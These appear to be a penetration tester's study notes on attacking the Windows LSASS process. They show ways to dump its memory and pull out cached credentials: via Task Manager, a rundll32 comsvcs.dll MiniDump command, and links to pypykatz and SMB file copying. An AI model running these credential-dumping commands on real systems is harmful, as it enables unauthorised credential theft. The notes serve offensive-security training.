# Attacking LSASS

* \
  Upon initial logon, LSASS will:
  * Cache credentials locally in memory
  * Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
  * Enforce security policies
  * Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

### Dumping LSASS Process Memory

#### Task Manager Method

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* A file called `lsass.DMP` is created and saved in:

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

* to copy files use
  * [Create SMB server Linux (HACK)](app://obsidian.md/Create%20SMB%20server%20Linux%20\(HACK\))

#### Rundll32.exe & Comsvcs.dll Method

* modern anti-virus tools recognize this method as malicious activity.
* Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`.
* This can be done from cmd or PowerShell:

**Finding LSASS PID in cmd**

```cmd-session
tasklist /svc
```

**Finding LSASS PID in PowerShell**

```powershell-session
Get-Process lsass
```

**Creating lsass.dmp using PowerShell**

```powershell-session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

* to copy files use
  * [create-smb-server-linux-hack.md](create-smb-server-linux-hack.md "mention")

### Using Pypykatz to Extract Credentials

* [pypykatz.md](pypykatz.md "mention")
